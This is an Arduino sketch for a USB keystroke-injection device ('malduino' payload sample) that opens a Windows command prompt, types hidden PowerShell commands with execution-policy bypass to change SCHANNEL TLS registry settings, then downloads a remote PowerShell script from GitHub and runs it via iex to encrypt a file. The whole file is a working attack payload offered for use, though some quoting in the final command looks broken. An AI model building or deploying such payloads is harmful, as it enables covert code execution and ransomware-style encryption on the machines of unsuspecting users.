/*
  Single File Encryption Payload for GENERIC USB ATMEGA32U4 hw
  Copyright (c) 2021, Paulo C. Marcon (Licensed under MIT)
  For more information see: https://github.com/pcmarcon/malduino-payload-sample
*/

#include "Keyboard.h"
#include "Mouse.h"

#define blinkInterval 50
#define ledPin 13           // generic USB ATMEGA32U4 hw use ledpin 13

int defaultDelay = 4;
int defaultCharDelay = 5;
int rMin = 0;
int rMax = 100;
bool ledOn = true;

void typeKey(int key) {
  Keyboard.press(key);
  delay(defaultCharDelay);
  Keyboard.release(key);
}

void setup() {
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  delay(1000);
  digitalWrite(ledPin, LOW);
  delay(1000);
  digitalWrite(ledPin, HIGH);
  delay(1000);
  digitalWrite(ledPin, LOW);
  delay(10000);             // extra 10s to help uploading new firmware
  Keyboard.begin();
  Mouse.begin();

  /* ----- Begin-Payload -----*/
  delay(1000);            // extra 1s delay, can be adjusted if needed
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  delay(500);
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("h:");   // change the drive letter here
  delay(1000);
  typeKey(KEY_RETURN);
  delay(1000);

  // change windows registry ssl/tsl settings to allow executing powershell script directly from github or other url
  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -Force) | iex\"");
  delay(defaultDelay);
  typeKey(KEY_RETURN);
  delay(defaultDelay);
  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex\"");
  delay(defaultDelay);
  typeKey(KEY_RETURN);
  delay(defaultDelay);
  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex\"");
  delay(defaultDelay);
  typeKey(KEY_RETURN);
  delay(defaultDelay);
  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -Force) | iex\"");
  delay(defaultDelay);
  typeKey(KEY_RETURN);
  delay(defaultDelay);
  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex\"");
  delay(defaultDelay);
  typeKey(KEY_RETURN);
  delay(defaultDelay);
  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-ItemProperty -path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\\Protocols\\TLS 1.3\\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex\"");
  delay(defaultDelay);
  typeKey(KEY_RETURN);
  delay(defaultDelay);
  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(reg add HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64) | iex\"");
  delay(defaultDelay);
  typeKey(KEY_RETURN);

  // run encryption script directly from github
  delay(defaultDelay);
  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \{set $type="single_enc"; $file="test.txt"; $file_path="d:"; $show_screen="yes"; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/payload.ps1') | iex\"");
  delay(defaultDelay);
  typeKey(KEY_RETURN);

  /* ----- End-Payload -----*/
  Keyboard.end();
}

void loop() {
  ledOn = !ledOn;
  digitalWrite(ledPin, ledOn);
  delay(blinkInterval);
}
